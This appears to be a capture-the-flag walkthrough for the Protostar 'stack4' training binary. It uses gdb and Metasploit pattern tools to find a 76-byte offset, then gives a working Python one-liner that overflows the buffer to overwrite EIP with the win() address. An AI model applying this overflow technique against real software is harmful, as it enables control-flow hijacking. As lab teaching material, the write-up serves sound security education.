Stack4 follows a very similar pattern of exploitation as Stack3.

First, use gdb to find the *win()* function.

```
﻿Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) break win
Breakpoint 1 at 0x80483fa: file stack4/stack4.c, line 8.
```

With that, the value for *EIP* will be **\xfa\x83\x04\x08**
 
Next is to figure out how much to put in the buffer to overflow into EIP.  I'll use the metasploit pattern_create script
again to make a 128 byte buffer, see if it creates the segmentation fault and if so inspect the registers.

```
﻿(gdb) run
Starting program: /opt/protostar/bin/stack4 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

Ideally, *0x63413563* should be the value overwritten into EIP, but just to verify.

```
﻿(gdb) i r
eax            0xbffff760	-1073744032
ecx            0xbffff760	-1073744032
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7b0	0xbffff7b0
ebp            0x41346341	0x41346341
esi            0x0	0
edi            0x0	0
eip            0x63413563	0x63413563
```

Last time I'll re-enforce this concept, but we'll convert that value to ASCII, which becomes cA5c, then account for this being
little-endian and get our offset from the metasploit tool.

```
﻿root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb c5Ac
[*] Exact match at offset 76
```

With an offset target of *76* and a payload of *\xfa\x83\x04\x08* we'll take a swing with the following code.

```
python -c 'print "A"*76 + "\xfa\x83\x04\x08"' | ./stack4
```

Successful Exploit

```
﻿user@protostar:/opt/protostar/bin$ python -c 'print "A"*76 + "\xfa\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
```

Move on to [Stack5](../stack5/)